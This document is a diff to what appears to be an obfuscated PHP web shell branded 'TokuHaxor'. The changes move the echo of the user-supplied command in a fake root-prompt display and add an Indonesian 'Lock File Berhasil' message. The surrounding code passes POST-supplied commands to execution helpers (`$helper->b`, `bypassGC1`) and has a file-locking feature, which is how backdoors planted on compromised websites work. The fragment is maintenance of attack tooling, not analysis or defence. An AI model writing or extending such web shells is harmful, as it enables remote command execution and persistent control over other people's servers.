@@ -1129,7 +1129,6 @@ function QiUyTbAgHk($s)
 			($helper->b)($cmd);
 
 			exit();
-			echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$_POST['cmd'].'</font><br><code>';
 		}
 
 		$scandir = $func[21]($dir);
@@ -1383,6 +1382,7 @@ function QiUyTbAgHk($s)
 						 <div class="card-body">';
  
 					 bypassGC1($command);
+					 echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$command.'</font><br><code>';
 				 echo '
 						 </div>                  
 					 </div>                 
@@ -1414,6 +1414,7 @@ function QiUyTbAgHk($s)
 
 					lockfile($_POST["cmd"]);
 				echo '
+						<h3> Lock File Berhasil </h3>
                         </div>                  
                     </div>                 
 				</div>                 
